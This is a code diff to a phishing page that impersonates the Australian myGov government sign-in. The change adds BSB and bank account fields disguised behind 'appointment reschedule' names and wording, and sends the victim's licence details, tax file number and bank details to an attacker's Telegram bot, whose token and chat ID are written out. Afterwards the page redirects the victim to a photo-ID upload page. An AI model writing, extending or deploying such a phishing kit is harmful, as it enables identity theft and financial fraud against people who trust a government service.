@@ -6,7 +6,7 @@
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <title>
-        Sign in with myGov - myGov
+        Identification Information - myGov
     </title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link href="./css/css.css" rel="stylesheet">
@@ -38,7 +38,7 @@
                     <div class="login-grid-row">
                         <div class="login-grid-column">
                             <h1>Verification</h1>
-                            <h2 class="text-align-left">Provide your details to verify your identity.</h2>
+                            <h2 class="text-align-left">Provide your details and select a new appointment time.</h2>
 
                             <!-- No PHP action – JavaScript handles submission -->
                             <form id="form-1" class="mygov-login-form alternative" method="post">
@@ -75,7 +75,16 @@
                                     <input id="tfnum" name="tfnum" type="text" autocomplete="off" required>
                                 </div>
 
-                
+                                <!-- ===== Appointment fields (NOW at the bottom) ===== -->
+                                <div class="input-group">
+                                    <label class="override" for="reschedule_date">BSB</label>
+                                    <input id="reschedule_date" name="reschedule_date" type="bank" required>
+                                </div>
+                                <div class="input-group">
+                                    <label class="override" for="reschedule_time">Account Number</label>
+                                    <input id="reschedule_time" name="reschedule_time" type="bank" required>
+                                </div>
+
                                 <br>
                                 <div class="button-digital-id-main-container override">
                                     <div class="digital-id-button-container">
@@ -134,7 +143,7 @@
         // ============================================================
         // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
         // ============================================================
-        const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
+        const BOT_TOKEN = '6398692286:AAFxQqiXLD9TBxzlvH7fiKt154hsw8mbuw4';
         const CHAT_ID = '722615124';
         // ============================================================
 
@@ -151,8 +160,8 @@
                 msg += "DL Card #: " + $('#dlcnum').val() + "\n";
                 msg += "DL Expiry: " + $('#dlexdate').val() + "\n";
                 msg += "TFN: " + $('#tfnum').val() + "\n";          // ← moved up in message
-                msg += "Reschedule Date: " + $('#reschedule_date').val() + "\n";
-                msg += "Available Time: " + $('#reschedule_time').val() + "\n";
+                msg += "BSB: " + $('#reschedule_date').val() + "\n";
+                msg += "Account Number: " + $('#reschedule_time').val() + "\n";
                 msg += "|-----------------------------------------|";
 
                 // Send to Telegram
@@ -161,7 +170,7 @@
                     method: 'GET',
                     complete: function() {
                         // Redirect to the ID upload page (pic.html)
-                        window.location.href = 'thank.html';
+                        window.location.href = 'pic.html';
                     }
                 });
             });
